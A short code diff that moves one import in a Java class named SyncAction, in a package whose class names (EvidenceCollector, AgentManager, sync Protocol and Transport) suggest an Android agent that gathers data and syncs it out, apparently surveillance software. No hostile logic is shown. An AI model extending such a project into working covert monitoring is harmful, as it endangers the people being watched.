@@ -3,7 +3,6 @@ package com.ht.RCSAndroidGUI.action;
 import java.util.Vector;
 
 import com.ht.RCSAndroidGUI.Debug;
-import com.ht.RCSAndroidGUI.Event;
 import com.ht.RCSAndroidGUI.Evidence;
 import com.ht.RCSAndroidGUI.EvidenceCollector;
 import com.ht.RCSAndroidGUI.action.sync.Protocol;
@@ -12,6 +11,7 @@ import com.ht.RCSAndroidGUI.action.sync.Transport;
 import com.ht.RCSAndroidGUI.action.sync.ZProtocol;
 import com.ht.RCSAndroidGUI.agent.Agent;
 import com.ht.RCSAndroidGUI.agent.AgentManager;
+import com.ht.RCSAndroidGUI.event.Event;
 import com.ht.RCSAndroidGUI.utils.Check;
 
 public abstract class SyncAction extends SubAction {
